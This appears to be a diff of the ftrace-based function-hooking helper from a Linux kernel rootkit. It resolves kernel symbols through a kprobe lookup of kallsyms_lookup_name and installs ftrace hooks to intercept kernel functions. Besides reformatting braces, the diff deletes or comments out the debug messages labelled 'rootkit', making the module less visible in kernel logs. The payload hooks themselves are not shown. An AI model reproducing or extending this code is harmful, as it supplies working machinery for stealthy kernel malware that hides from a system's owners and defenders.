@@ -9,7 +9,8 @@ struct kprobe kp = {
 };
 #endif
 
-int fh_resolve_hook_address(struct ftrace_hook *hook) {
+int fh_resolve_hook_address(struct ftrace_hook *hook)
+{
 #ifdef KPROBE_LOOKUP
     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
     kallsyms_lookup_name_t kallsyms_lookup_name;
@@ -20,7 +21,6 @@ int fh_resolve_hook_address(struct ftrace_hook *hook) {
     hook->address = kallsyms_lookup_name(hook->name);
 
     if (!hook->address) {
-        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
         return -ENOENT;
     }
 
@@ -33,7 +33,8 @@ int fh_resolve_hook_address(struct ftrace_hook *hook) {
     return 0;
 }
 
-void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs) {
+void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
+{
     struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
 #if USE_FENTRY_OFFSET
@@ -44,7 +45,8 @@ void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct f
 #endif
 }
 
-int fh_install_hook(struct ftrace_hook *hook) {
+int fh_install_hook(struct ftrace_hook *hook)
+{
     int err;
     err = fh_resolve_hook_address(hook);
     if (err)
@@ -57,33 +59,33 @@ int fh_install_hook(struct ftrace_hook *hook) {
 
     err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
     if (err) {
-        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
         return err;
     }
 
     err = register_ftrace_function(&hook->ops);
     if (err) {
-        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
         return err;
     }
 
     return 0;
 }
 
-void fh_remove_hook(struct ftrace_hook *hook) {
+void fh_remove_hook(struct ftrace_hook *hook)
+{
     int err;
     err = unregister_ftrace_function(&hook->ops);
-    if (err) {
-        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
-    }
+//    if (err) {
+//        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
+//    }
 
     err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-    if (err) {
-        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
-    }
+//    if (err) {
+//        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+//    }
 }
 
-int fh_install_hooks(struct ftrace_hook *hooks, size_t count) {
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
+{
     int err;
     size_t i;
 
@@ -101,7 +103,8 @@ error:
     return err;
 }
 
-void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
+{
     size_t i;
 
     for (i = 0 ; i < count ; i++)
